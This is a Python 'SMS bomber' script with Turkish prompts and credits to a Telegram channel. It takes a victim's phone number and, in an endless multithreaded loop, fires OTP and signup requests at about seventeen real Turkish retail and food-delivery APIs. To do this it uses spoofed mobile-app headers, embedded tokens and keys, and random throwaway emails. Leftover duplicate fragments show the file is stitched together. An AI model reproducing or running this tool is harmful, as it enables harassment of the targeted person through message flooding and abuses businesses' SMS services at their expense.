import requests
import time

session = requests.Session()

phone = input("Numarayı gir (10 hane, 555xxxxxxx): ").strip()

if len(phone) != 10 or not phone.isdigit():
    print("Hatalı format knk!")
    exit()

print(f"\n{phone} numarasına otp gönderiliyor.\n")
time.sleep(2)

basarili = 0
toplam = 0

import random, string, requests, json, uuid, webbrowser
from concurrent.futures import ThreadPoolExecutor
webbrowser.open("https://t.me/thomasgruplar")
E='\033[1;31m';Y='\033[1;34m';Z='\033[1;31m';X='\033[1;33m';Z1='\033[2;31m';F='\033[2;32m';A='\033[2;34m';C='\033[2;35m';S='\033[2;36m';G='\033[1;34m';M='\x1b[1;37m';B='\x1b[1;37m';O='\x1b[38;5;208m'      

def file(number):
    try:
        r=requests.post("https://api.filemarket.com.tr/v1/otp/send",json={"mobilePhoneNumber":f"90{number}"},timeout=5)
        return (r.json().get("data")=="200 OK"),"filemarket.com.tr"
    except:
        return False,"filemarket.com.tr"
def kimgbister(number):
    try:
        url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
        payload = {"msisdn" : f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "kimgbiister"
        else:
            return False, "kimgbiister"
    except:
        return False, "kimgbiister"
def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload={"operationName":"GENERATE_OTP","variables":{"phone":f"+90{number}","challenge":str(uuid.uuid4()),"deviceUniqueId":f"web_{uuid.uuid4()}"},"query":"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "tiklagelsin.com"
        else:
            return False, "tiklagelsin.com"
    except:
        return False, "tiklagelsin.com"
def bim(number):
    try:
        url = "https://bim.veesk.net:443/service/v1.0/account/login"
        r = requests.post(url, json={"phone": number}, timeout=6)
        if r.status_code == 200:
            return True, "bim.veesk.net"
        else:
            return False, "bim.veesk.net"
    except:
        return False, "bim.veesk.net"
def bodrum(number):
    try:
        url = "https://gandalf.orwi.app:443/api/user/requestOtp"
        headers={"Content-Type":"application/json","Accept":"application/json","Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-GB,en;q=0.9","Token":"","Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Origin":"capacitor://localhost","Region":"EN","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148","Connection":"keep-alive"}
        payload = {"gsm": f"+90{number}", "source": "orwi"}
        r = requests.post(url, headers=headers, json=payload, timeout=6)
        if r.status_code == 200:
            return True, "gandalf.orwi.app"
        else:
            return False, "gandalf.orwi.app"
    except:
        return False, "gandalf.orwi.app"
def dominos(number, mail):
    try:
        url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
        headers={"Content-Type":"application/json;charset=utf-8","Accept":"application/json, text/plain, */*","Authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg","Device-Info":"Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8","Appversion":"IOS-7.1.0","Accept-Encoding":"gzip, deflate, br","Accept-Language":"tr-TR,tr;q=0.9","User-Agent":"Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0","Servicetype":"CarryOut","Locationcode":"undefined"}
        json_data = {"email": mail, "isSure": False, "mobilePhone": number}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.json().get("isSuccess") == True:
            return True, "frontend.dominos.com.tr"
        else:
            return False, "frontend.dominos.com.tr"
    except:
        return False, "frontend.dominos.com.tr"
               
def uysal(number):
    try:
        url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
        headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0","Accept":"application/json, text/plain, */*","Accept-Encoding":"gzip, deflate, br","Content-Type":"application/json;charset=utf-8","Origin":"https://www.uysalmarket.com.tr","Dnt":"1","Sec-Gpc":"1","Referer":"https://www.uysalmarket.com.tr/","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-site","Priority":"u=0","Te":"trailers"}
        json_data = {"phone_number": number}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "api.uysalmarket.com.tr"
        else:
            return False, "api.uysalmarket.com.tr"
    except:
        return False, "api.uysalmarket.com.tr"        
def kofteciyusuf(number):
    try:
        url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
        headers={"Content-Type":"application/json; charset=utf-8","Anonymousclientid":"","Accept":"application/json","Ostype":"iOS","Appversion":"4.0.4.0","Accept-Language":"en-GB,en;q=0.9","Firmaid":"82","X-Guatamala-Kirsallari":"@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq","Accept-Encoding":"gzip, deflate, br","Language":"tr-TR","User-Agent":"YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
        json_data = {
            "FireBaseCihazKey": None,
            "FirmaId": 82,
            "GuvenlikKodu": None,
            "Telefon": f"90{number}"
        }
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.json().get("Success") == True:
            return True, "poskofteciyusuf.com"
        else:
            return False, "poskofteciyusuf.com"
    except:
        return False, "poskofteciyusuf.com"
def komagene(number):
    try:
        url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
        json_data = {"FirmaId": 32, "Telefon": f"90{number}"}
        headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0","Accept":"*/*","Accept-Encoding":"gzip, deflate, br","Referer":"https://www.komagene.com.tr/","Anonymousclientid":"0dbf392b-ab10-48b3-5cda-31f3c19816e6","Firmaid":"32","X-Guatamala-Kirsallari":"@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq","Content-Type":"application/json","Origin":"https://www.komagene.com.tr","Dnt":"1","Sec-Gpc":"1","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-site","Priority":"u=0","Te":"trailers","Connection":"keep-alive"}
        r = requests.post(url=url, headers=headers, json=json_data, timeout=6)
        if r.json().get("Success") == True:
            return True, "komagene.com"
        else:
            return False, "komagene.com"
    except:
        return False, "komagene.com"
def yapp(number, mail):
    try:
        url = "https://yapp.com.tr:443/api/mobile/v1/register"
        headers={"Accept":"application/json","Content-Type":"application/json","X-Content-Language":"en","Accept-Language":"en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8","Authorization":"Bearer ","User-Agent":"YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)","Accept-Encoding":"gzip, deflate, br"}
        payload={"app_version":"1.1.5","code":"tr","device_model":"iPhone8,5","device_name":"thomas","device_type":"I","device_version":"15.8.3","email":mail,"firstname":"shelby","is_allow_to_communication":"1","language_id":"2","lastname":"yilmaz","phone_number":number,"sms_code":""}
        r = requests.post(url, json=payload, headers=headers, timeout=6)
        if r.status_code == 200:
            return True, "yapp.com.tr"
        else:
            return False, "yapp.com.tr"
    except:
        return False, "yapp.com.tr"
def evidea(number, mail):
    try:
        url = "https://www.evidea.com:443/users/register/"
        headers={"Content-Type":"multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi","X-Project-Name":"undefined","Accept":"application/json, text/plain, */*","X-App-Type":"akinon-mobile","X-Requested-With":"XMLHttpRequest","Accept-Language":"tr-TR,tr;q=0.9","Cache-Control":"no-store","Accept-Encoding":"gzip, deflate","X-App-Device":"ios","Referer":"https://www.evidea.com/","User-Agent":"Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0","X-Csrftoken":"7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
        data = (f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"first_name\"\r\n\r\nthomas\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"last_name\"\r\n\r\ncan\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"email\"\r\n\r\n{mail}\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"phone\"\r\n\r\n0{number}\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n")
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.status_code == 202:
            return True, "evidea.com"
        else:
            return False, "evidea.com"
    except:
        return False, "evidea.com"

def ucdortbes(number):
    try:
        url = "https://api.345dijital.com:443/api/users/register"
        headers={"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Accept-Encoding":"gzip, deflate","User-Agent":"AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0","Accept-Language":"en-US,en;q=0.9","Authorization":"null","Connection":"close"}
        json_data={"email":"","name":"thomas","phoneNumber":f"+90{number}","surname":"Bas"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
       
        if r.json().get("error") == "E-Posta veya telefon zaten kayıtlı!":
            return False, "api.345dijital.com"
        else:
            
            return True, "api.345dijital.com"
    except:
        
        return True, "api.345dijital.com"     
def suiste(number):
    try:
        url = "https://suiste.com:443/api/auth/code"
        headers={"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","X-Mobillium-Device-Brand":"Apple","Accept":"application/json","X-Mobillium-Os-Type":"iOS","X-Mobillium-Device-Model":"iPhone","Mobillium-Device-Id":"2390ED28-075E-465A-96DA-DFE8F84EB330","Accept-Language":"en","Accept-Encoding":"gzip, deflate, br","X-Mobillium-App-Build-Number":"1469","User-Agent":"suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1","X-Mobillium-Os-Version":"15.8.3","X-Mobillium-App-Version":"1.7.11"}
        data={"action":"register","device_id":"2390ED28-075E-465A-96DA-DFE8F84EB330","full_name":"thomas yilmaz","gsm":number,"is_advertisement":"1","is_contract":"1","password":"thomas31"}
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.json().get("code") == "common.success":
            return True, "suiste.com"
        else:
            return False, "suiste.com"
    except:
        return False, "suiste.com"
def porty(number):
    try:
        url = "https://panel.porty.tech:443/api.php?"
        headers={"Accept":"*/*","Content-Type":"application/json; charset=UTF-8","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9","User-Agent":"Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0","Token":"q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
        json_data={"job":"start_login","phone":number}
        r = requests.post(url=url, json=json_data, headers=headers, timeout=6)
        if r.json().get("status") == "success":
            return True, "panel.porty.tech"
        else:
            return False, "panel.porty.tech"
    except:
        return False, "panel.porty.tech"              
def orwi(number):
    try:
        url = "https://gandalf.orwi.app:443/api/user/requestOtp"
        headers={"Content-Type":"application/json","Accept":"application/json","Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-GB,en;q=0.9","Token":"","Apikey":"YWxpLTEyMzQ1MTEyNDU2NTQzMg","Origin":"capacitor://localhost","Region":"EN","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148","Connection":"keep-alive"}
        json_data = {"gsm": f"+90{number}", "source": "orwi"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "gandalf.orwi.app"
        else:
            return False, "gandalf.orwi.app"
    except:
        return False, "gandalf.orwi.app"
def naosstars(number):
    try:
        url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
        headers={"Uniqid":"9c9fa861-cc5d-43c0-b4ea-1b541be15351","User-Agent":"naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0","Access-Control-Allow-Origin":"*","Locale":"en-TR","Version":"1.0030","Os":"ios","Apiurl":"https://api.naosstars.com/api/","Device-Id":"D41CE5F3-53BB-42CF-8611-B4FE7529C9BC","Platform":"ios","Accept-Language":"en-US,en;q=0.9","Timezone":"Europe/Istanbul","Globaluuidv4":"d57bd5d2-cf1e-420c-b43d-61117cf9b517","Timezoneoffset":"-180","Accept":"application/json","Content-Type":"application/json; charset=utf-8","Accept-Encoding":"gzip, deflate","Apitype":"mobile_app"}
        json_data = {"telephone": f"+90{number}", "type": "register"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "api.naosstars.com"
        else:
            return False, "api.naosstars.com"
    except:
        return False, "api.naosstars.com"   
def metro(number):
    try:
        url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
        headers={"Accept":"*/*","Content-Type":"application/json; charset=utf-8","Accept-Encoding":"gzip, deflate, br","Applicationversion":"2.4.1","Applicationplatform":"2","User-Agent":"Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1","Accept-Language":"en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8","Connection":"keep-alive"}
        json_data = {"methodType": "2", "mobilePhoneNumber": number}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.json().get("status") == "success":
            return True, "mobile.metro-tr.com"
        else:
            return False, "mobile.metro-tr.com"
    except:
        return False, "mobile.metro-tr.com"                             
        
        
        

def thomas_mail():
    chars = string.ascii_lowercase + string.digits
    tho_mail = ''.join(random.choice(chars) for _ in range(8))
    return tho_mail + "@hotmail.com"
def sms_bomber(number, spam=10): 
    apiler = [file, kimgbister, tiklagelsin, bim, bodrum, dominos, komagene, evidea, kofteciyusuf, yapp, uysal, ucdortbes, suiste, porty, orwi, naosstars, metro]    
    basarili_sms = 0
    def api_ac(kral):
        if kral in [dominos, evidea, yapp]:
            mail = thomas_mail()
            return kral(number, mail)
        else:
            return kral(number)
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for _ in range(spam):
            for kral in apiler:
                futures.append(executor.submit(api_ac, kral))
        for future in futures:
            success, source = future.result()
            if success:
                print(f"{F}Başarılı ✅ [ {number} ]  --> {source}")
                basarili_sms += 1
            else:
                print(f"{E}Başarısız ❌ [ {number}  ] --> {source}")                                     
def tumas():
    t5omas = f"""
{F}░██████╗███╗░░░███╗░██████╗
██╔════╝████╗░████║██╔════╝
╚█████╗░██╔████╔██║╚█████╗░
░╚═══██╗██║╚██╔╝██║░╚═══██╗
██████╔╝██║░╚═╝░██║██████╔╝
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░

██████╗░░█████╗░███╗░░░███╗██████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗
██████╦╝██║░░██║██╔████╔██║██████╦╝
██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
{M}"""
    print(t5omas)
# - @thomashack / @maybethomas
if __name__ == "__main__":
    tumas()
    print("\x1b[1;39m—"*60)
    print("~ Programmer : @cumhurbaskani | Channel: @ThomasGruplar ~")
    print("\x1b[1;39m—"*60)    
    phone = input("\x1b[1;36m  ~ Telefon No Gir : (+90 olmadan ) : ").strip()
    if not (phone.isdigit() and len(phone) == 10):
        print("\x1b[1;39m—"*60)    
        print("\x1b[1;31m  Doğru numara gir kral 🤭")
        exit()
    while True:
        sms_bomber(phone, spam=10)
print(f"9 siteden {basarili} tane başarılı oldu.")

print("Kendi numaranla dene, spam klasörünü de kontrol et 😎")
